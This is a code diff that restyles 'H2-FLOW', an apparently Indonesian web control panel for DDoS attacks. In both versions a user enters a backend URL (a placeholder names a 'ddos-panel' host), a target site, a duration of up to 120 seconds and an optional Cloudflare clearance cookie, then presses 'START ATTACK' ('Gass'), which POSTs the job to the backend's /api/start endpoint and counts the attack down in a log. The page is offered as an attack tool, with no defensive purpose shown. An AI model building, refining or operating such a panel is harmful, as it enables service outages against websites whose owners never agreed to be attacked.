@@ -3,493 +3,357 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>H2-FLOW Panel</title>
+    <title>YT : DIZFLYZE</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: #0a0a0a;
-            color: #fff;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
+            background: #0b0b0b;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
-        .container {
-            max-width: 500px;
-            width: 100%;
-            background: #1a1a1a;
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-            border: 1px solid #2a2a2a;
-        }
+        .dashboard { max-width:780px; width:100%; }
         .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .header h1 {
-            font-size: 28px;
-            font-weight: 300;
-            letter-spacing: 2px;
-        }
-        .header h1 span {
-            color: #ff4444;
-            font-weight: 700;
-        }
-        .header p {
-            color: #888;
-            font-size: 12px;
-            margin-top: 5px;
-        }
-        .status-bar {
             display: flex;
+            align-items: baseline;
             justify-content: space-between;
-            align-items: center;
-            background: #0a0a0a;
-            padding: 12px 16px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            border-left: 3px solid #ffaa00;
+            border-bottom:1px solid #2a2a2a;
+            padding-bottom:12px;
+            margin-bottom:28px;
         }
-        .status-bar .status-text {
-            font-size: 14px;
-            color: #aaa;
+        .header h1 { font-weight:300; font-size:1.8rem; letter-spacing:1px; color:#f0f0f0; }
+        .header h1 span { color:#e74c3c; font-weight:400; }
+        .header .status { font-size:0.8rem; color:#7c7c7c; letter-spacing:0.5px; }
+        .header .status .dot {
+            display:inline-block; width:8px; height:8px;
+            border-radius:50%; margin-right:6px;
         }
-        .status-bar .status-text strong {
-            color: #ffaa00;
+        .dot.ready { background:#2ecc71; }
+        .dot.busy { background:#e74c3c; animation:pulse 1s infinite; }
+        .dot.cooldown { background:#f39c12; animation:pulse 1s infinite; }
+        .dot.waiting { background:#3498db; animation:pulse 1s infinite; }
+        .dot.offline { background:#666; }
+        @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.4; } 100% { opacity:1; } }
+        .info-grid {
+            display:grid; grid-template-columns:1fr 1fr; gap:6px 30px;
+            margin-bottom:30px; padding:0 2px; font-size:0.9rem;
         }
-        .status-bar .badge {
-            background: #ffaa0022;
-            color: #ffaa00;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            border: 1px solid #ffaa0044;
+        .info-grid .item {
+            display:flex; justify-content:space-between;
+            padding:6px 0; border-bottom:1px solid #1e1e1e;
+            word-break: break-all;
         }
-        .form-group {
-            margin-bottom: 18px;
+        .info-grid .item .label { color:#7c7c7c; flex-shrink:0; margin-right:10px; }
+        .info-grid .item .value { color:#e0e0e0; font-weight:400; text-align:right; }
+        .section-title {
+            font-size:0.75rem; text-transform:uppercase; letter-spacing:1.5px;
+            color:#5c5c5c; margin:28px 0 14px 0;
+            border-bottom:1px solid #1a1a1a; padding-bottom:6px;
         }
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            color: #aaa;
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
+        .form-group { margin-bottom:16px; }
+        .form-group label { display:block; font-size:0.8rem; color:#b0b0b0; margin-bottom:4px; letter-spacing:0.3px; }
         .form-group input {
-            width: 100%;
-            padding: 12px 14px;
-            background: #0a0a0a;
-            border: 1px solid #2a2a2a;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
-            transition: all 0.3s;
-            outline: none;
+            width:100%; padding:10px 12px; background:#161616;
+            border:1px solid #2a2a2a; border-radius:4px; color:#f0f0f0;
+            font-size:0.95rem; transition:border 0.2s; outline:none;
         }
-        .form-group input:focus {
-            border-color: #ff4444;
-            box-shadow: 0 0 20px rgba(255,68,68,0.1);
+        .form-group input:focus { border-color:#e74c3c; }
+        .form-group input::placeholder { color:#555; }
+        .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+        .btn {
+            display:inline-block; width:100%; padding:12px;
+            background:#e74c3c; border:none; border-radius:4px;
+            color:#fff; font-weight:500; font-size:1rem; letter-spacing:1px;
+            cursor:pointer; transition:background 0.2s, transform 0.1s; margin-top:8px;
         }
-        .form-group input::placeholder {
-            color: #555;
-        }
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-        .btn-attack {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #ff4444, #cc0000);
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
-        }
-        .btn-attack:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(255,68,68,0.3);
-        }
-        .btn-attack:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
+        .btn:hover:not(:disabled) { background:#c0392b; }
+        .btn:active { transform:scale(0.98); }
+        .btn:disabled { opacity:0.5; cursor:not-allowed; background:#555; }
         .btn-test {
-            width: 100%;
-            padding: 10px;
-            background: #2a2a2a;
-            border: 1px solid #3a3a3a;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
+            background:#2a2a2a; border:1px solid #3a3a3a; margin-top:4px;
         }
-        .btn-test:hover {
-            background: #3a3a3a;
+        .btn-test:hover:not(:disabled) { background:#3a3a3a; }
+        .btn-test.success { border-color:#2ecc71; color:#2ecc71; }
+        .btn-test.error { border-color:#e74c3c; color:#e74c3c; }
+        .log-area { margin-top:30px; border-top:1px solid #1e1e1e; padding-top:16px; }
+        .log-area .log-header {
+            display:flex; justify-content:space-between;
+            font-size:0.7rem; color:#5c5c5c; letter-spacing:0.5px; margin-bottom:6px;
         }
-        .btn-test.success {
-            border-color: #00ff88;
-            color: #00ff88;
+        .log-area .log-content {
+            background:#0f0f0f; padding:12px 14px; border-radius:4px;
+            font-family:'Fira Code', monospace; font-size:0.8rem; color:#a0a0a0;
+            max-height:160px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+            border-left:2px solid #2a2a2a;
         }
-        .btn-test.error {
-            border-color: #ff4444;
-            color: #ff4444;
-        }
-        .logs {
-            margin-top: 25px;
-            background: #0a0a0a;
-            border-radius: 8px;
-            padding: 14px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            border: 1px solid #1a1a1a;
-        }
-        .logs .log-entry {
-            color: #aaa;
-            padding: 4px 0;
-            border-bottom: 1px solid #111;
-        }
-        .logs .log-entry .time {
-            color: #666;
-        }
-        .logs .log-entry .success {
-            color: #00ff88;
-        }
-        .logs .log-entry .error {
-            color: #ff4444;
-        }
-        .logs::-webkit-scrollbar {
-            width: 4px;
-        }
-        .logs::-webkit-scrollbar-track {
-            background: #0a0a0a;
-        }
-        .logs::-webkit-scrollbar-thumb {
-            background: #2a2a2a;
-            border-radius: 4px;
-        }
+        .log-area .log-content .attack-started { color:#2ecc71; }
+        .log-area .log-content .error { color:#e74c3c; }
+        .log-area .log-content .cooldown-info { color:#f39c12; }
+        .log-area .log-content .system { color:#3498db; }
         .footer {
-            text-align: center;
-            color: #333;
-            font-size: 11px;
-            margin-top: 20px;
-            border-top: 1px solid #1a1a1a;
-            padding-top: 15px;
+            margin-top:30px; font-size:0.7rem; color:#3a3a3a;
+            text-align:center; border-top:1px solid #1a1a1a; padding-top:16px;
         }
-        @media (max-width: 600px) {
-            .form-row {
-                grid-template-columns: 1fr;
-                gap: 0;
-            }
-            .container {
-                padding: 20px;
-            }
+        .log-content::-webkit-scrollbar { width:4px; }
+        .log-content::-webkit-scrollbar-track { background:#0f0f0f; }
+        .log-content::-webkit-scrollbar-thumb { background:#2a2a2a; border-radius:4px; }
+        @media (max-width:600px) {
+            .header { flex-direction:column; align-items:flex-start; gap:6px; }
+            .info-grid { grid-template-columns:1fr; gap:4px; }
+            .form-row { grid-template-columns:1fr; gap:0; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>⚡ H2-<span>FLOW</span></h1>
-            <p>Web Panel • Diz Flyze Ofc</p>
-        </div>
-        
-        <div class="status-bar" id="statusBar">
-            <div class="status-text">Status: <strong id="statusText">Ready</strong></div>
-            <div class="badge" id="statusBadge">● Online</div>
-        </div>
-        
-        <form id="attackForm">
-            <!-- INPUT URL BACKEND (BARU!) -->
-            <div class="form-group">
-                <label>🔗 Backend URL</label>
-                <input type="url" id="backendUrl" placeholder="https://ddos-panel-production.up.railway.app" required>
-            </div>
-            
-            <div class="form-group">
-                <label>🎯 Target URL</label>
-                <input type="url" id="target" placeholder="https://example.com" required>
-            </div>
-            
-            <div class="form-row">
-                <div class="form-group">
-                    <label>⏱️ Duration (s)</label>
-                    <input type="number" id="duration" value="60" min="1" max="120">
-                </div>
-                <div class="form-group">
-                    <label>🍪 Cookie (optional)</label>
-                    <input type="text" id="cookie" placeholder="cf_clearance=...">
-                </div>
-            </div>
-            
-            <button type="submit" class="btn-attack" id="attackBtn">🔥 START ATTACK</button>
-            <button type="button" class="btn-test" id="testBtn">🔍 Test Backend Connection</button>
-        </form>
-        
-        <div class="logs" id="logContainer">
-            <div class="log-entry">[system] Panel ready</div>
-            <div class="log-entry">[system] Masukkan URL backend, lalu klik Test Connection</div>
-        </div>
-        
-        <div class="footer">
-            YT : DIZFLYZE • Made with ❤️
-        </div>
+<div class="dashboard">
+    <div class="header">
+        <h1>H2-<span>FLOW</span></h1>
+        <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">Ready</span></div>
     </div>
+    <div class="info-grid">
+        <div class="item"><span class="label">Backend</span><span class="value" id="info-backend">—</span></div>
+        <div class="item"><span class="label">Duration</span><span class="value" id="info-duration">—</span></div>
+        <div class="item"><span class="label">Cookie</span><span class="value" id="info-cookie">—</span></div>
+        <div class="item"><span class="label">Status</span><span class="value" id="info-status">—</span></div>
+        <div class="item"><span class="label">Cooldown</span><span class="value" id="info-ipcooldown">—</span></div>
+        <div class="item"><span class="label">Dilarang Sampai</span><span class="value" id="info-ipbanned">—</span></div>
+    </div>
+    <div class="section-title">configuration</div>
+    <form id="attack-form">
+        <div class="form-group">
+            <label for="backendUrl">Backend URL</label>
+            <input type="url" id="backendUrl" name="backendUrl" placeholder="https://ddos-panel-production.up.railway.app" required>
+        </div>
+        <div class="form-group">
+            <label for="target">Target</label>
+            <input type="text" id="target" name="target" placeholder="https://example.com" required>
+        </div>
+        <div class="form-row">
+            <div class="form-group">
+                <label for="duration">Duration (max 120)</label>
+                <input type="number" id="duration" name="duration" value="60" min="1" max="120" required>
+            </div>
+            <div class="form-group">
+                <label for="cookie">Cookie (Optional)</label>
+                <input type="text" id="cookie" name="cookie" placeholder="cf_clearance=...">
+            </div>
+        </div>
+        <button type="submit" class="btn" id="launchBtn">Gass</button>
+        <button type="button" class="btn btn-test" id="testBtn">Test Backend Connection</button>
+    </form>
+    <div class="log-area">
+        <div class="log-header"><span>Output Terminal</span><span id="log-count">0 Data</span></div>
+        <div class="log-content" id="log-content">[system] Ready</div>
+    </div>
+    <div class="footer">YT : DIZFLYZE</div>
+</div>
+<script>
+    var API_URL = '';
+    var isAttacking = false;
+    var attackInterval = null;
+    var timerInterval = null;
 
-    <script>
-        // ==================== STATE ====================
-        let isAttacking = false;
-        let attackInterval = null;
-        let API_URL = '';
-        
-        // ==================== DOM REFS ====================
-        const form = document.getElementById('attackForm');
-        const backendUrlInput = document.getElementById('backendUrl');
-        const targetInput = document.getElementById('target');
-        const durationInput = document.getElementById('duration');
-        const cookieInput = document.getElementById('cookie');
-        const attackBtn = document.getElementById('attackBtn');
-        const testBtn = document.getElementById('testBtn');
-        const statusText = document.getElementById('statusText');
-        const statusBadge = document.getElementById('statusBadge');
-        const logContainer = document.getElementById('logContainer');
-        
-        // ==================== LOGGER ====================
-        function addLog(message, type = 'info') {
-            const time = new Date().toLocaleTimeString();
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            
-            let msgClass = '';
-            if (type === 'success') msgClass = 'success';
-            if (type === 'error') msgClass = 'error';
-            
-            entry.innerHTML = `<span class="time">[${time}]</span> <span class="${msgClass}">${message}</span>`;
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-            
-            while (logContainer.children.length > 50) {
-                logContainer.removeChild(logContainer.firstChild);
-            }
+    var form = document.getElementById('attack-form');
+    var backendUrlInput = document.getElementById('backendUrl');
+    var targetInput = document.getElementById('target');
+    var durationInput = document.getElementById('duration');
+    var cookieInput = document.getElementById('cookie');
+    var launchBtn = document.getElementById('launchBtn');
+    var testBtn = document.getElementById('testBtn');
+    var statusDot = document.getElementById('statusDot');
+    var statusText = document.getElementById('statusText');
+    var infoStatus = document.getElementById('info-status');
+    var infoBackend = document.getElementById('info-backend');
+    var infoDuration = document.getElementById('info-duration');
+    var infoCookie = document.getElementById('info-cookie');
+    var infoIpCooldown = document.getElementById('info-ipcooldown');
+    var infoIpBanned = document.getElementById('info-ipbanned');
+    var logContent = document.getElementById('log-content');
+    var logCount = document.getElementById('log-count');
+
+    function addLog(message, type) {
+        var time = new Date().toLocaleTimeString();
+        var entry = document.createElement('div');
+        var cls = '';
+        if (type === 'success') cls = 'attack-started';
+        else if (type === 'error') cls = 'error';
+        else if (type === 'cooldown') cls = 'cooldown-info';
+        else if (type === 'system') cls = 'system';
+        entry.innerHTML = '<span style="color:#666;">[' + time + ']</span> <span class="' + cls + '">' + message + '</span>';
+        logContent.appendChild(entry);
+        logContent.scrollTop = logContent.scrollHeight;
+        while (logContent.children.length > 50) {
+            logContent.removeChild(logContent.firstChild);
         }
-        
-        // ==================== TEST BACKEND ====================
-        async function testBackend() {
-            const url = backendUrlInput.value.trim();
-            
-            if (!url) {
-                addLog('❌ Masukkan URL backend dulu!', 'error');
-                return false;
-            }
-            
-            // Bersihin URL
-            let cleanUrl = url.replace(/\/+$/, '');
-            if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
-                cleanUrl = 'https://' + cleanUrl;
-            }
-            
-            API_URL = cleanUrl;
-            
-            addLog(`🔍 Testing backend: ${API_URL}...`, 'info');
-            testBtn.textContent = '⏳ Testing...';
-            testBtn.disabled = true;
-            
-            try {
-                const response = await fetch(`${API_URL}/api/health`);
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    addLog(`✅ Backend connected! Status: ${data.status}`, 'success');
-                    testBtn.className = 'btn-test success';
-                    testBtn.textContent = '✅ Connected!';
-                    statusText.textContent = 'Backend Ready';
-                    statusBadge.textContent = '● Online';
-                    statusBadge.style.color = '#00ff88';
-                    statusBadge.style.borderColor = '#00ff8844';
-                    statusBadge.style.background = '#00ff8822';
-                    return true;
-                } else {
-                    addLog(`❌ Backend error: HTTP ${response.status}`, 'error');
-                    testBtn.className = 'btn-test error';
-                    testBtn.textContent = '❌ Failed';
-                    return false;
-                }
-            } catch (error) {
-                addLog(`❌ Backend offline: ${error.message}`, 'error');
-                testBtn.className = 'btn-test error';
-                testBtn.textContent = '❌ Failed';
-                statusText.textContent = 'Backend Offline';
-                statusBadge.textContent = '● Offline';
-                statusBadge.style.color = '#ff4444';
-                statusBadge.style.borderColor = '#ff444444';
-                statusBadge.style.background = '#ff444422';
-                return false;
-            } finally {
-                testBtn.disabled = false;
-                setTimeout(() => {
-                    testBtn.className = 'btn-test';
-                    testBtn.textContent = '🔍 Test Backend Connection';
-                }, 3000);
-            }
+        updateLogCount();
+    }
+
+    function updateLogCount() {
+        var lines = logContent.innerHTML.split('\n').filter(function(l) { return l.trim() !== ''; });
+        logCount.textContent = lines.length + ' events';
+    }
+
+    function updateStatus(status, type) {
+        statusText.textContent = status;
+        infoStatus.textContent = status;
+        var dotMap = { 'ready': 'ready', 'busy': 'busy', 'cooldown': 'cooldown', 'waiting': 'waiting', 'offline': 'offline' };
+        statusDot.className = 'dot ' + (dotMap[type] || 'ready');
+    }
+
+    function setButtonLoading(loading) {
+        if (loading) {
+            launchBtn.disabled = true;
+            launchBtn.textContent = 'PROCESSING...';
+        } else {
+            launchBtn.disabled = false;
+            launchBtn.textContent = 'Gass';
         }
-        
-        // ==================== START ATTACK ====================
-        async function startAttack(target, duration, cookie) {
-            try {
-                const response = await fetch(`${API_URL}/api/start`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        target: target,
-                        duration: duration,
-                        cookie: cookie || ''
-                    })
-                });
-                
-                if (!response.ok) {
-                    const text = await response.text();
-                    throw new Error(`HTTP ${response.status}: ${text}`);
-                }
-                
-                const data = await response.json();
-                return data;
-            } catch (error) {
-                throw new Error(`Gagal mulai attack: ${error.message}`);
-            }
+    }
+
+    function updateInfo(data) {
+        infoDuration.textContent = data.duration ? data.duration + 's' : '—';
+        infoCookie.textContent = data.cookie || '—';
+        infoIpCooldown.textContent = data.ip_cooldown > 0 ? data.ip_cooldown + 's' : '—';
+        infoIpBanned.textContent = data.ip_banned > 0 ? data.ip_banned + 's' : '—';
+    }
+
+    function testBackend() {
+        var url = backendUrlInput.value.trim();
+        if (!url) {
+            addLog('Masukkan URL backend dulu', 'error');
+            return false;
         }
-        
-        // ==================== UI UPDATES ====================
-        function updateStatus(status, isRunning = false) {
-            statusText.textContent = status;
-            if (isRunning) {
-                statusBadge.textContent = '● Attacking';
-                statusBadge.style.color = '#ff4444';
-                statusBadge.style.borderColor = '#ff444444';
-                statusBadge.style.background = '#ff444422';
-            }
+        var cleanUrl = url.replace(/\/+$/, '');
+        if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
+            cleanUrl = 'https://' + cleanUrl;
         }
-        
-        function setButtonLoading(loading) {
-            if (loading) {
-                attackBtn.disabled = true;
-                attackBtn.textContent = '⏳ PROCESSING...';
+        API_URL = cleanUrl;
+        infoBackend.textContent = API_URL;
+        localStorage.setItem('backendUrl', API_URL);
+        addLog('Testing backend: ' + API_URL, 'system');
+        testBtn.textContent = 'Testing...';
+        testBtn.disabled = true;
+        fetch(API_URL + '/api/health', {
+            method: 'GET',
+            headers: { 'Content-Type': 'application/json' }
+        }).then(function(response) {
+            if (response.ok) {
+                return response.json();
             } else {
-                attackBtn.disabled = false;
-                attackBtn.textContent = '🔥 START ATTACK';
+                throw new Error('HTTP ' + response.status);
             }
+        }).then(function(data) {
+            addLog('Backend connected. Status: ' + data.status, 'success');
+            testBtn.className = 'btn btn-test success';
+            testBtn.textContent = 'Connected';
+            updateStatus('Backend Ready', 'ready');
+        }).catch(function(error) {
+            addLog('Backend offline: ' + error.message, 'error');
+            testBtn.className = 'btn btn-test error';
+            testBtn.textContent = 'Failed';
+            updateStatus('Backend Offline', 'offline');
+        }).finally(function() {
+            testBtn.disabled = false;
+            setTimeout(function() {
+                testBtn.className = 'btn btn-test';
+                testBtn.textContent = 'Test Backend Connection';
+            }, 3000);
+        });
+        return false;
+    }
+
+    function startAttack(target, duration, cookie) {
+        return fetch(API_URL + '/api/start', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                target: target,
+                duration: duration,
+                cookie: cookie || ''
+            })
+        }).then(function(response) {
+            if (!response.ok) {
+                return response.text().then(function(text) {
+                    throw new Error('HTTP ' + response.status + ': ' + text);
+                });
+            }
+            return response.json();
+        });
+    }
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (!API_URL) {
+            addLog('Test backend connection dulu', 'error');
+            return;
         }
-        
-        // ==================== FORM HANDLER ====================
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            // Cek backend URL
-            if (!API_URL) {
-                addLog('❌ Test backend connection dulu!', 'error');
-                return;
-            }
-            
-            if (isAttacking) {
-                addLog('⛔ Attack masih jalan!', 'error');
-                return;
-            }
-            
-            const target = targetInput.value.trim();
-            const duration = parseInt(durationInput.value);
-            const cookie = cookieInput.value.trim();
-            
-            if (!target) {
-                addLog('❌ Target URL harus diisi!', 'error');
-                return;
-            }
-            
-            if (!target.startsWith('http://') && !target.startsWith('https://')) {
-                addLog('❌ URL harus pake http:// atau https://', 'error');
-                return;
-            }
-            
-            if (isNaN(duration) || duration < 1 || duration > 120) {
-                addLog('❌ Durasi harus 1-120 detik', 'error');
-                return;
-            }
-            
-            isAttacking = true;
-            setButtonLoading(true);
-            updateStatus('Starting...', true);
-            
-            addLog(`🚀 Mulai attack ke ${target} selama ${duration}s...`, 'success');
-            
-            try {
-                const result = await startAttack(target, duration, cookie);
-                addLog(`✅ Attack jalan! ID: ${result.id || 'N/A'}`, 'success');
-                updateStatus(`Attacking (${duration}s)`, true);
-                
-                let remaining = duration;
-                attackInterval = setInterval(() => {
-                    remaining--;
-                    if (remaining <= 0) {
-                        clearInterval(attackInterval);
-                        attackInterval = null;
-                        isAttacking = false;
-                        setButtonLoading(false);
-                        updateStatus('Ready', false);
-                        addLog('✅ Attack selesai!', 'success');
-                    } else {
-                        updateStatus(`Attacking (${remaining}s)`, true);
-                    }
-                }, 1000);
-                
-            } catch (error) {
-                addLog(`❌ ${error.message}`, 'error');
-                isAttacking = false;
-                setButtonLoading(false);
-                updateStatus('Error', false);
-            }
-        });
-        
-        // ==================== TEST BUTTON ====================
-        testBtn.addEventListener('click', testBackend);
-        
-        // ==================== CLEANUP ====================
-        window.addEventListener('beforeunload', () => {
-            if (attackInterval) {
-                clearInterval(attackInterval);
-            }
-        });
-        
-        // ==================== INIT ====================
-        addLog('✅ Panel siap!', 'success');
-        addLog('💡 Masukkan URL backend, lalu klik "Test Backend Connection"');
-        
-        // Auto-load URL dari localStorage
-        const savedUrl = localStorage.getItem('backendUrl');
-        if (savedUrl) {
-            backendUrlInput.value = savedUrl;
-            addLog(`📌 Loaded saved backend URL: ${savedUrl}`, 'info');
-            // Auto test
-            setTimeout(testBackend, 500);
+        if (isAttacking) {
+            addLog('Attack masih jalan', 'error');
+            return;
         }
-        
-        // Save URL ke localStorage
-        backendUrlInput.addEventListener('change', () => {
-            localStorage.setItem('backendUrl', backendUrlInput.value.trim());
+        var target = targetInput.value.trim();
+        var duration = parseInt(durationInput.value);
+        var cookie = cookieInput.value.trim();
+        if (!target) {
+            addLog('Target harus diisi', 'error');
+            return;
+        }
+        if (!target.startsWith('http://') && !target.startsWith('https://')) {
+            addLog('Target harus pake http:// atau https://', 'error');
+            return;
+        }
+        if (isNaN(duration) || duration < 1 || duration > 120) {
+            addLog('Durasi harus 1-120 detik', 'error');
+            return;
+        }
+        isAttacking = true;
+        setButtonLoading(true);
+        updateStatus('Attacking...', 'busy');
+        updateInfo({ duration: duration, cookie: cookie, ip_cooldown: 0, ip_banned: 0 });
+        addLog('Mulai attack ke ' + target + ' selama ' + duration + 's', 'success');
+        startAttack(target, duration, cookie).then(function(result) {
+            addLog('Attack started. ID: ' + (result.id || 'N/A'), 'success');
+            var remaining = duration;
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(function() {
+                remaining--;
+                if (remaining <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    isAttacking = false;
+                    setButtonLoading(false);
+                    updateStatus('Ready', 'ready');
+                    addLog('Attack selesai', 'success');
+                } else {
+                    updateStatus('Attacking (' + remaining + 's)', 'busy');
+                }
+            }, 1000);
+        }).catch(function(error) {
+            addLog(error.message, 'error');
+            isAttacking = false;
+            setButtonLoading(false);
+            updateStatus('Error', 'offline');
         });
-    </script>
+    });
+
+    testBtn.addEventListener('click', testBackend);
+
+    window.addEventListener('beforeunload', function() {
+        if (timerInterval) clearInterval(timerInterval);
+    });
+
+    addLog('[system] Ready', 'system');
+    var savedUrl = localStorage.getItem('backendUrl');
+    if (savedUrl) {
+        backendUrlInput.value = savedUrl;
+        addLog('Loaded saved backend: ' + savedUrl, 'system');
+        setTimeout(testBackend, 500);
+    }
+    updateLogCount();
+</script>
 </body>
 </html>
